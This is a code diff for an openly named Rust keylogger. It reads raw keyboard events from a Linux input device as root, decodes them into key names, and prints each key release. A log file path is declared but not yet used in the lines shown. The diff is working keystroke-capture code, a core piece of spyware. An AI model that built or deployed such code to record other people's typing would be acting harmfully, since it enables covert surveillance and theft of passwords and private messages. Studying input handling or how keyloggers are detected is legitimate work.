@@ -5,11 +5,21 @@ use std::{
     mem,
 };
 
+use libc::input_event;
+
 use crate::common::Common;
-use super::input::InputEvent;
+use super::input::{
+    KEY_NAMES,
+    SHIFT_KEY_NAMES,
+    MAX_KEYS,
+    UK,
+};
 
 const EVENT_PATH: &str = "/dev/input/event5";
 const DATA_PATH: &str = "/tmp/data.log";
+
+const EV_SIZE: usize = mem::size_of::<input_event>();
+const EV_KEY: u16 = 1;
 
 pub struct Keylogger { }
 
@@ -21,46 +31,30 @@ impl Common for Keylogger {
     fn start_logging(&self) {
         check_root();
 
-        let mut buf: [u8; 24] = unsafe { mem::zeroed() };  
-
         let mut device_file = File::open(EVENT_PATH).unwrap_or_else(|e| panic!("Could not open device file: {}", e) );
-        let ev_size = mem::size_of::<InputEvent>();
+        let mut buf: [u8; EV_SIZE] = unsafe { mem::zeroed() };  
 
         loop {
             match device_file.read(&mut buf) {
                 Ok(num) => {
-                    println!("{}", num);
-
-                    if num != ev_size {
+                    if num != EV_SIZE {
                         panic!("Error while reading!");
                     }
+
+                    let ev = unsafe { mem::transmute::<[u8; EV_SIZE], input_event>(buf) };
+                    self.log_keystroke(ev);
                 },
                 Err(e) => panic!("Could not read: {}", e)
             }
-
-            // let numread = match file.read(&mut buf) {
-            //     Ok(n) => n,
-            //     Err(e) => {
-            //         println!("Could not read: {}", e);
-            //     }
-            // };
-            //
-            // match str::from_utf8(&buf) {
-            //     Ok(s) => println!("Read {} bytes! Contents: {}", numread, s),
-            //     Err(e) => {
-            //         println!("Could not convert: {}", e);
-            //         continue;
-            //     }
-            // }
         }
     }
 
-    fn stop_logging(&self) {
+    fn log_keystroke(&self, ev: input_event) {
+        if ev.type_ == EV_KEY && ev.value == 0 {
+            let key = KEY_NAMES[ev.code as usize];
 
-    }
-
-    fn log_keystroke(&self) -> char {
-        'h'
+            println!("{}", key);
+        }
     }
 }
 
